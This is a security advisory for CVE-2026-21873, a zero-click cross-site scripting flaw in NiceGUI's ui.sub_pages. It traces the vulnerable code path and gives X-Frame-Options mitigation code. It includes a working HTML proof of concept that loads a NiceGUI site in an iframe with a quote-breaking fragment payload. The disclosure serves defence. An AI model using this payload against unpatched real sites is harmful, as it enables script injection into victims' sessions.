# [H] NiceGUI apps which use `ui.sub_pages` vulnerable to zero-click XSS

## Summary
Severity: High
Advisory: GHSA-mhpg-c27v-6mxr
CVE: CVE-2026-21873
CWE: CWE-79
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N (CVSS_V3)
Published: 2026-01-08
Source: https://github.com/advisories/GHSA-mhpg-c27v-6mxr
Type: github-advisory

## Affected
- PyPI: `nicegui` — affected >=2.22.0 <3.5.0

## Details
### Summary

An unsafe implementation in the `pushstate` event listener used by `ui.sub_pages` allows an attacker to manipulate the fragment identifier of the URL, which _they can do despite being cross-site, using an iframe_. 

### Details

The problem is traced as follows:

1. On `pushstate`, `handleStateEvent` is executed. 

https://github.com/zauberzeug/nicegui/blob/59fa9424c470f1b12c5d368985fa36e21fda706b/nicegui/elements/sub_pages.js#L38-L39

2. `handleStateEvent` emits `sub_pages_open` event. 

https://github.com/zauberzeug/nicegui/blob/59fa9424c470f1b12c5d368985fa36e21fda706b/nicegui/elements/sub_pages.js#L22-L25 

3. `SubPagesRouter` (used by `ui.sub_pages`), lisnening on `sub_pages_open`, `_handle_open` runs. 

https://github.com/zauberzeug/nicegui/blob/59fa9424c470f1b12c5d368985fa36e21fda706b/nicegui/sub_pages_router.py#L18-L22

4. `_handle_open` finds any `SubPages` and runs `_show()` on them

https://github.com/zauberzeug/nicegui/blob/59fa9424c470f1b12c5d368985fa36e21fda706b/nicegui/sub_pages_router.py#L63-L71

5. If the if-logic is followed or debug prints are added, it can be found that it calls `self._handle_scrolling(match, behavior='smooth')` directly

https://github.com/zauberzeug/nicegui/blob/59fa9424c470f1b12c5d368985fa36e21fda706b/nicegui/elements/sub_pages.py#L76-L100

6. **CULPRIT** `_handle_scrolling` runs `_scroll_to_fragment` as there is a fragment, which runs vulnerable JS if the `fragment` (attacker-controlled) escapes out of the quotes. 

https://github.com/zauberzeug/nicegui/blob/59fa9424c470f1b12c5d368985fa36e21fda706b/nicegui/elements/sub_pages.py#L206-L217

### PoC

Just visiting this page (no click required), consistently triggers XSS in https://nicegui.io domain. 

```html
<html>
  <body>
    <iframe id="myiframe" src="https://nicegui.io" width="100%" height="600px" onload="triggerXSS()"></iframe>
    <script>
      function triggerXSS() {
        if (!myiframe.src.includes("#")) {
          myiframe.src = "https://nicegui.io#x');alert(document.domain)//";
        }
      }
    </script>
  </body>
</html>
```

<img width="1429" height="643" alt="image" src="https://github.com/user-attachments/assets/310dbb5c-65d5-44f2-8417-dcf044829bc6" />

### Impact

Any page which uses `ui.sub_pages` and does not actively prevent itself from being put in an iframe is affected.

The impact is high since by-default NiceGUI pages are iframe-embeddable with no native opt-out functionalities except by manipulating the underlying `app` via FastAPI methods, and that `ui.sub_pages` is actively promoted as the new modern way to create Single-Page Applications (SPA). 

### Patch

1. Not use `ui.sub_pages`
2. Block iframe with the following code

```py
@app.middleware('http')
async def iframe_blocking_middleware(request, call_next):
    response = await call_next(request)
    response.headers['X-Frame-Options'] = 'DENY'
    return response
```

### Appendix

AI is used safely to judge the CVSS scoring (input is censored).

Please find the results in https://poe.com/s/3FXuwp7TAYxqLomARXma

### Scoring update after manual review

The scoring done by AI was quite biased. Upon further review it is less dramatic. 

- User Interaction **None**: There's _almost_ no interaction required, and none of the interaction is with the vulnerable system.
- Confidentiality & Integrity **Low**: The extent of data confidentiality & integrity loss is bounded by the highest priviledged user in the entire NiceGUI application. There does not exist a means of performing data manipulating tasks that said admin cannot already do. 
- Availability **None**: No DDoS is possible with this. Site remains performant as ever.

## References
- https://github.com/zauberzeug/nicegui/security/advisories/GHSA-mhpg-c27v-6mxr
- https://nvd.nist.gov/vuln/detail/CVE-2026-21873
- https://github.com/zauberzeug/nicegui
- https://github.com/zauberzeug/nicegui/releases/tag/v3.5.0
